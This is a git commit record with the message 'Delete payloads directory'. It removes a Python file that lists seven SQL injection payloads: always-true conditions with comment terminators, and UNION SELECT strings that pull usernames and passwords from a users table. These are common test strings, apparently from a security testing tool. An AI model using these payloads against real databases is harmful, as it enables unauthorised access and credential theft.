7069e9aea8333dbff937baaa513ae81b4dea629f
D3m3t0r_ <128257558+RetrO-M@users.noreply.github.com>
2024-12-10 19:59:53 +0100

    Delete payloads directory

--- payloads/sqli.py
+++
@@ -1,9 +0,0 @@
-sqli_payloads = [
-    "' OR '1'='1",
-    "' OR '1'='1' --",
-    "' OR '1'='1' /*",
-    "' UNION SELECT NULL, username, password FROM users --",
-    "' OR 'a'='a",
-    "' AND 1=2 UNION SELECT NULL, username, password FROM users --",
-    "' OR EXISTS(SELECT * FROM users) --"
-]
